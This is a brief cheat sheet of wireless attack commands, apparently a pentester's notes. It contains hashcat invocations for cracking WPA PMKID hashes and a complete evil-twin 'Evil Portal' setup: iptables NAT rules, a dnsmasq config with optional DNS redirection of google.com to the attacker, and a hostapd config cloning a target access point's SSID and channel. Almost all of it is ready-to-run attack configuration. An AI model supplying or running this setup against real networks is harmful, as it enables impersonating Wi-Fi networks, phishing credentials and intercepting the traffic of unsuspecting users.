# Wireless

### PMKID Cracking with Hashcat:

```
sudo hashcat -a X -w 3 -m 22000 (hash/file) (wordlist)/(charset)
Eg. sudo hashcat -a 0 -w 3 -m 22000 crackme.txt rockyou.txt
Eg. sudo hashcat -a 0 -w 3 -m 22000 crackme.txt ?d?d?d?d?d?d?d?d
```

### Evil Portal

```
sudo airmon-ng check kill
sudo ifconfig (interface) up 10.0.0.1 netmask 255.255.255.0
sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
sudo IP-Tables.sh
sudo service apache2 start
sudo dnsmasq -C EvilTwin/dnsmasq.conf
sudo hostapd EvilTwin/hostapd.conf -B
```

**IP-Tables.sh:**

```
sudo iptables --flush
sudo iptables --table nat --append POSTROUTING --out-interface (internet interface) -j MASQUERADE 
sudo iptables --append FORWARD --in-interface (wireless interface) -j ACCEPT 
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
```

**dnsmasq.conf:**

```
# Set the wifi interface
interface=(interface)

# Set the IP range that can be given to clients
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,8h

# Set the gateway IP address
dhcp-option=3,10.0.0.1

# Set DNS server address
dhcp-option=6,10.0.0.1

# Set Server
server=8.8.8.8

# logs
log-queries
log-dhcp

# Redirect all requests to 10.0.0.1
#address=/#/10.0.0.1

# Redirect google to 10.0.0.1
#address=/google.com/10.0.0.1
#address=/www.google.com/10.0.0.1
#address=/google.com/www.google.com.com/10.0.0.1
```

**hostapd.conf:**

```
interface=(interface)
driver=nl80211
ssid=(Target AP)
hw_mode=g
channel=(Target channel)
macaddr_acl=0
ignore_broadcast_ssid=0
```
